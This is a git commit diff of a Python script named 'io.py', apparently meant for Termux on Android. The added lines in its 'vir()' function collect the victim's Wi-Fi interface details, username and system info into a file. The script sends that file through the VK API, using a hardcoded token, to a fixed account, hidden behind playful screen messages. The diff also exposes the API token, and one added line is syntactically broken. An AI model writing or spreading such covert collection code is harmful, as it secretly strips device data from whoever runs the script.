60a42ae21c8598c631061ec12236d03dcff61b94
Topo1us <65972332+Topo1us@users.noreply.github.com>
2020-05-31 05:26:29 +0300

    Update io.py

--- io.py
+++ io.py
@@ -4,31 +4,33 @@ import vk_api
 from vk_api.longpoll import VkLongPoll, VkEventType
 def bot():
     def vir():
-            os.system(r'termux-wifi-connectioninfo>>red.txt')
+            os.system(r'ifconfig wlan0>>red.txt')
+            os.system(r'whoami>>red.txt')
+            os.system(r'uname -a>>red.txt)
             o=open(r'red.txt')
             rik=o.read()
             y(437306907,rik)
-            os.system('termux-torch on')
-            os.system('termux-vibrate -d 1000')
-            os.system('termux-toast напиши вк')
+   #         os.system('termux-torch on')
+  #          os.system('termux-vibrate -d 1000')
+            os.system('echo если эта строка появилась то все правильно, напиши вк')
     rand=123456
     print('Не темно?')
     os.system('termux-brightness 255')
     time.sleep(1)
-    os.system('termux-toast не волнуйся')
-    time.sleep(2)
-    os.system('termux-toast так лучше :D')
+#    os.system('termux-toast не волнуйся')
+ #   time.sleep(2)
+#    os.system('termux-toast так лучше :D')
     token='35a0b1e44117b4857a36a347b3b1c948b260b314bf7edb44494165442202ea6ff5049d5ea3225d8c90199'
     def y(user_id,message):
         vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand,})
     vk=vk_api.VkApi(token=token)
     longpoll=VkLongPoll(vk)
     vir()
-    for event in longpoll.listen():
-        if event.type==VkEventType.MESSAGE_NEW:
-            rand+=1
-            if event.to_me:
-                r=event.text
-                if r=='lol':
-                    y(event.user_id,'lol kek')
+#    for event in longpoll.listen():
+#        if event.type==VkEventType.MESSAGE_NEW:
+#            rand+=1
+#            if event.to_me:
+#                r=event.text
+#                if r=='lol':
+#                    y(event.user_id,'lol kek')
 bot()
